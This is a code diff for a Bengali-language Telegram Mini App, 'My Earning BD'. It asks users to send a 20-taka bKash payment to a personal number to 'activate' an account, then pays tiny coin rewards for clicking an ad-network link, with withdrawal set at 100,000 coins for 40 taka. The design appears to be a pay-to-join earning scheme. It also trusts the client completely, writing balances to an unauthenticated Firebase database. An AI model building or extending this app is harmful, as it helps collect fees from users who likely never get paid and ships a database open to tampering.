@@ -6,47 +6,170 @@
     <title>Earn Money Mini App</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background: #17212b; color: white; text-align: center; padding: 20px; }
-        .balance-box { background: #242f3d; padding: 15px; border-radius: 10px; margin-bottom: 20px; }
-        .task-card { background: #242f3d; padding: 15px; margin: 10px 0; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; }
-        button { background: #1485c9; color: white; border: none; padding: 10px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; text-align: center; padding: 15px; margin: 0; }
+        .container { max-width: 450px; margin: 0 auto; }
+        .card { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #334155; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
+        .btn { background: #3b82f6; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; box-sizing: border-box; font-size: 15px; transition: 0.2s; }
+        .btn:hover { background: #2563eb; }
+        .btn-success { background: #10b981; }
+        .btn-success:hover { background: #059669; }
+        .btn-warning { background: #f59e0b; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: white; box-sizing: border-box; text-align: center; }
+        .flex-box { display: flex; justify-content: space-between; gap: 10px; }
+        .badge { background: #ef4444; padding: 3px 8px; border-radius: 5px; font-size: 12px; font-weight: bold; }
+        .social-links a { display: inline-block; margin: 5px; color: #3b82f6; text-decoration: none; font-size: 14px; }
     </style>
 </head>
 <body>
+<div class="container">
 
-    <h2>Earn Coins 🇧🇩</h2>
-    <div class="balance-box">
-        <h3>Your Balance: <span id="balance">0</span> Coins</h3>
+    <h2>My Earning BD 💵</h2>
+    
+    <div class="social-links" style="margin-bottom: 15px;">
+        <a href="https://t.me/incomezone28" target="_blank">📢 Telegram</a> | 
+        <a href="https://www.youtube.com/@%E0%A6%AC%E0%A6%BE%E0%A6%B6%E0%A7%87%E0%A6%B0%E0%A6%PA%E0%A6%A4%E0%A6%BE-%E0%A7%AC%E0%A7%AD%E0%A7%AE" target="_blank">📺 YouTube</a> | 
+        <a href="https://www.instagram.com/nishijannat1?igsh=MXBvNjY0dDZocHlkcA==" target="_blank">📸 Instagram</a>
     </div>
 
-    <div class="task-card">
-        <div>
-            <h4>Join Telegram Channel</h4>
-            <p>+50 Coins</p>
+    <div id="activation-screen" class="card">
+        <h3 style="color: #ef4444;">⚠️ অ্যাকাউন্ট ইনঅ্যাক্টিভ!</h3>
+        <p>অ্যাকাউন্ট অ্যাক্টিভ করতে ২০ টাকা সেন্ডমানি করুন।</p>
+        <p style="background: #0f172a; padding: 10px; border-radius: 8px; font-weight: bold; color: #10b981;">
+            বিকাশ পার্সোনাল: 01540560027
+        </p>
+        <input type="text" id="txid-input" placeholder="বিকাশ ট্রানজেকশন আইডি (TxID) দিন">
+        <input type="text" id="ref-by-input" placeholder="রেফার কোড (ঐচ্ছিক)">
+        <button class="btn btn-success" onclick="submitActivation()">অ্যাক্টিভেশনের জন্য পাঠান</button>
+    </div>
+
+    <div id="pending-screen" class="card" style="display:none;">
+        <h3 style="color: #f59e0b;">⏳ অনুরোধ পেন্ডিং আছে</h3>
+        <p>আপনার পাঠানো ট্রানজেকশন আইডিটি অ্যাডমিন চেক করছেন। কিছুক্ষণের মধ্যে অ্যাকাউন্ট অ্যাক্টিভ হয়ে যাবে।</p>
+    </div>
+
+    <div id="main-app" style="display:none;">
+        
+        <div class="card flex-box">
+            <div style="flex:1; border-right: 1px solid #334155;">
+                <p style="margin:0; font-size:12px; color:#94a3b8;">কাজের ব্যালেন্স</p>
+                <h3 style="margin:5px 0; color:#3b82f6;"><span id="coin-balance">0</span> Coins</h3>
+            </div>
+            <div style="flex:1;">
+                <p style="margin:0; font-size:12px; color:#94a3b8;">রেফার ব্যালেন্স</p>
+                <h3 style="margin:5px 0; color:#10b981;"><span id="ref-balance">0</span> টাকা</h3>
+            </div>
         </div>
-        <button onclick="doTask('https://t.me/your_channel')">Start</button>
-    </div>
 
-    <div class="task-card">
-        <div>
-            <h4>Watch YouTube Video</h4>
-            <p>+30 Coins</p>
+        <div class="card">
+            <p style="margin:0 0 5px 0; font-size:14px;">👥 আপনার রেফার কোড (টেলিগ্রাম আইডি):</p>
+            <span id="my-ref-code" style="font-weight:bold; color:#f59e0b; background:#0f172a; padding:5px 10px; border-radius:5px;">000000</span>
         </div>
-        <button onclick="doTask('https://youtube.com')">Start</button>
+
+        <div class="card">
+            <h3>🎁 ডেইলি ক্লাইম</h3>
+            <p>নিচের বাটনে ক্লিক করে বিজ্ঞাপনের লিংকে যান এবং ৩,০০০ কয়েন ক্লাইম করুন।</p>
+            <button id="claim-btn" class="btn" onclick="startClaim()">Claim 3000 Coins</button>
+        </div>
+
+        <div class="card">
+            <h3>💰 উইথড্র (টাকা তুলুন)</h3>
+            <div style="margin-bottom: 15px; text-align: left; font-size: 14px; background:#0f172a; padding:10px; border-radius:8px;">
+                • ১ লাখ কয়েন = ৪০ টাকা (নূন্যতম ১ লাখ কয়েন লাগবে)<br>
+                • রেফার টাকা নূন্যতম ২০ টাকা হলেই উইথড্র।
+            </div>
+            <input type="text" id="wallet-number" placeholder="বিকাশ/নগদ নাম্বার দিন">
+            <div class="flex-box">
+                <button class="btn btn-warning" onclick="withdraw('coins')">কয়েন উইথড্র</button>
+                <button class="btn btn-success" onclick="withdraw('ref')">রেফার উইথড্র</button>
+            </div>
+        </div>
+
     </div>
 
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
+</div>
 
-        let currentBalance = 0;
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "test_user_1";
+    document.getElementById('my-ref-code').innerText = userId;
 
-        function doTask(url) {
-            tg.openLink(url);
-            // আপাতত টেস্ট করার জন্য ক্লিক করলেই ১০ কয়েন যোগ হবে
-            currentBalance += 10;
-            document.getElementById('balance').innerText = currentBalance;
+    const dbUrl = "https://my-earning-bd-4016c-default-rtdb.firebaseio.com"; 
+
+    let userData = { active: false, pending: false, coins: 0, refMoney: 0, lastClaim: "" };
+
+    async function loadData() {
+        let res = await fetch(`${dbUrl}/users/${userId}.json`);
+        let data = await res.json();
+        if(data) {
+            userData = data;
+            updateUI();
         }
-    </script>
+    }
+
+    function updateUI() {
+        if(userData.active) {
+            document.getElementById('activation-screen').style.display = 'none';
+            document.getElementById('pending-screen').style.display = 'none';
+            document.getElementById('main-app').style.display = 'block';
+            document.getElementById('coin-balance').innerText = userData.coins;
+            document.getElementById('ref-balance').innerText = userData.refMoney;
+        } else if(userData.pending) {
+            document.getElementById('activation-screen').style.display = 'none';
+            document.getElementById('pending-screen').style.display = 'block';
+        }
+    }
+
+    async function submitActivation() {
+        const txid = document.getElementById('txid-input').value.trim();
+        const refBy = document.getElementById('ref-by-input').value.trim();
+        if(!txid) return alert("অনুগ্রহ করে ট্রানজেকশন আইডি দিন!");
+
+        userData.pending = true;
+        await fetch(`${dbUrl}/users/${userId}.json`, { method: 'PUT', body: JSON.stringify(userData) });
+        await fetch(`${dbUrl}/requests/${userId}.json`, { method: 'PUT', body: JSON.stringify({ txid: txid, refBy: refBy, time: new Date().toLocaleDateString() }) });
+        
+        alert("আপনার রিকোয়েস্ট সাবমিট হয়েছে!");
+        updateUI();
+    }
+
+    function startClaim() {
+        const today = new Date().toLocaleDateString();
+        if(userData.lastClaim === today) {
+            return alert("আপনি আজকে ইতিমধ্যেই ৩,০০০ কয়েন ক্লাইম করেছেন! আগামীকাল আবার চেষ্টা করুন।");
+        }
+        tg.openLink("https://www.effectivecpmnetwork.com/zbke4sd4p8?key=92d580dbb91e1d93820f0773956f0a71");
+        
+        setTimeout(async () => {
+            userData.coins += 3000;
+            userData.lastClaim = today;
+            await fetch(`${dbUrl}/users/${userId}.json`, { method: 'PUT', body: JSON.stringify(userData) });
+            updateUI();
+            alert("অভিনন্দন! ৩,০০০ কয়েন আপনার ব্যালেন্সে যোগ হয়েছে।");
+        }, 3000);
+    }
+
+    async function withdraw(type) {
+        const num = document.getElementById('wallet-number').value.trim();
+        if(!num) return alert("বিকাশ বা নগদ নাম্বার দিন!");
+
+        if(type === 'coins') {
+            if(userData.coins < 100000) return alert("কয়েন উইথড্র করতে নূন্যতম ১,০০,০০০ কয়েন লাগবে!");
+            userData.coins -= 100000;
+            await fetch(`${dbUrl}/withdrawals.json`, { method: 'POST', body: JSON.stringify({ userId, num, type: "Coins (40 Tk)", time: new Date().toLocaleString() }) });
+        } else {
+            if(userData.refMoney < 20) return alert("রেফার ব্যালেন্স নূন্যতম ২০ টাকা হতে হবে!");
+            let amount = userData.refMoney;
+            userData.refMoney = 0;
+            await fetch(`${dbUrl}/withdrawals.json`, { method: 'POST', body: JSON.stringify({ userId, num, type: `Refer Money (${amount} Tk)`, time: new Date().toLocaleString() }) });
+        }
+        
+        await fetch(`${dbUrl}/users/${userId}.json`, { method: 'PUT', body: JSON.stringify(userData) });
+        updateUI();
+        alert("উইথড্র রিকোয়েস্ট সফল হয়েছে! অ্যাডমিন কিছুক্ষণের মধ্যে টাকা পাঠিয়ে দেবেন।");
+    }
+
+    loadData();
+</script>
 </body>
 </html>
